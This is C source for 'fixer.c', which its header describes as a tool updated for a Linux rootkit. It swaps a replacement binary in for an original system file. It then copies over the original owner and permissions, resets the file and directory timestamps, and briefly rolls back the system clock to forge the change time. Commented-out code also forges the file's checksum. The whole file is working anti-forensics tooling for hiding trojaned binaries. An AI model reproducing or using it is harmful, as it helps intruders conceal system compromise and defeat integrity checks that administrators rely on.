/*
 *	fixer.c
 *	by Idefix 
 *	inspired on sum.c and SaintStat 2.0
 *	updated by Cybernetik for linux rootkit
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

main (argc,argv)
int	argc;
char	**argv;
{
	unsigned orig_crc,current_crc,temp;
	unsigned char diff1,diff2,buf[20];
	char	systemstr[100],directory[200],*strptr;
	struct 	stat statbuf,dirbuf;
	long 	position;
	FILE	*f;
	int 	i,fix=1;


	if (argc<3) {usage();exit(1);}

	if (strptr=strrchr(argv[1],'/')) {
		strncpy(directory,argv[1],(strptr-argv[1]));
		directory[(strptr-argv[1])]='\0';
		}
	else strcpy(directory,".");	

	stat(argv[1],&statbuf);
	stat(directory,&dirbuf);

	/*
	if (sum(argv[1],&orig_crc)!=0) exit(1);
	if (sum(argv[2],&current_crc)!=0) exit(1);
	*/

	if (argc==4) {
	sprintf(systemstr,"mv %s %s",argv[1],argv[3]);
	system(systemstr);
	}
	sprintf(systemstr,"cp %s %s",argv[2],argv[1]);
	system(systemstr);

	/*
	diff1=(orig_crc&0xFF)-(current_crc&0xFF);
	temp=(current_crc+diff1)&0xFFFF;
	for(i=0;i<8;i++)
	{
	   if (temp&1) temp = (temp>>1) + 0x8000;
	   else	temp >>= 1;
	}
	diff2=((orig_crc&0xFF00)>>8)-(temp&0xFF);
	temp=(temp+diff2)&0xFFFF;
	for(i=0;i<8;i++)
	{
	   if (temp&1) temp = (temp>>1) + 0x8000;
	   else	temp >>= 1;
	}
	if ((temp-orig_crc)==1) diff1=diff1-1;

	if ((f = fopen(argv[1], "r+b")) == NULL) {
	    fprintf (stderr, "fix: Can't open %s\n", argv[1]);
	    exit(1);
	}
	fseek(f,0L,SEEK_END);
	position=ftell(f)-17;
	fseek(f,position,SEEK_SET);
	fread(buf,17,1,f);
	for(i=0;i<17;i++)
	   if (buf[i]!=0) {
	      fprintf(stderr,"fix: Last 17 bytes not zero\n");
	      fprintf(stderr,"fix: Can't fix checksum\n");
	      fix=0;
	      break;
	   }
	if (fix) {
	   buf[0]=diff1;
	   buf[8]=diff2;
	   fseek(f,position,SEEK_SET);
	   fwrite(buf,17,1,f);
	}
	fclose(f);	
	*/
	
	if (chown(argv[1],statbuf.st_uid,statbuf.st_gid)) {
	   fprintf(stderr,"fix: No permission to change owner or no such file\n");
	   exit(1);
	}
	
	if (chmod(argv[1],statbuf.st_mode)) {
   	fprintf(stderr,"fix: No permission to change mode or no such file\n");
   	exit(1);
	}

	fixtime((char *)argv[1],statbuf);
	fixtime((char *)directory,dirbuf);

	fprintf(stderr,"fix: File %s fixed\n",argv[1]);
	return 0;	
}


sum (file,crc)
char	*file;
unsigned *crc;
{
	unsigned sum;
	int i, c;
	FILE *f;
	long nbytes;
	int	errflg = 0;

	if ((f = fopen(file, "r")) == NULL) {
	    fprintf (stderr, "fix: Can't open %s\n", file);
	    return(1);
	}
	sum = 0;
	nbytes = 0;
	while ((c = getc(f)) != EOF) {
	    nbytes++;
	    if (sum&01)
		sum = (sum>>1) + 0x8000;
	    else
		sum >>= 1;
	    sum += c;
	    sum &= 0xFFFF;
	}
	if (ferror (f)) {
	    errflg++;
	    fprintf (stderr, "fix: read error on %s\n",file);
	}
	fclose (f);
	*crc=sum;
	return(0);
}


int fixtime(filename,buf)
char *filename;
struct stat buf;
{
        struct  timeval ftime[2], otime, ntime;
        struct  timezone tzp;

        ftime[0].tv_sec = buf.st_atime;
        ftime[1].tv_sec = buf.st_mtime;
        ntime.tv_sec    = buf.st_ctime;
        ftime[0].tv_usec=ftime[1].tv_usec=ntime.tv_usec=0;


        if (gettimeofday(&otime,&tzp)) {
           fprintf(stderr,"fix: Can't read time of day\n");
           exit(1);
        }

        if (settimeofday(&ntime,&tzp)) {
           fprintf(stderr,"fix: Can't set time of day\n");
        }

        if (utimes(filename,ftime)) {
           fprintf(stderr,"fix: Can't change modify time\n");
        }
        settimeofday(&otime,&tzp);
}

usage()
{
	fprintf(stderr,"Usage:\n");
	fprintf(stderr,"fix original replacement [backup]\n");
}
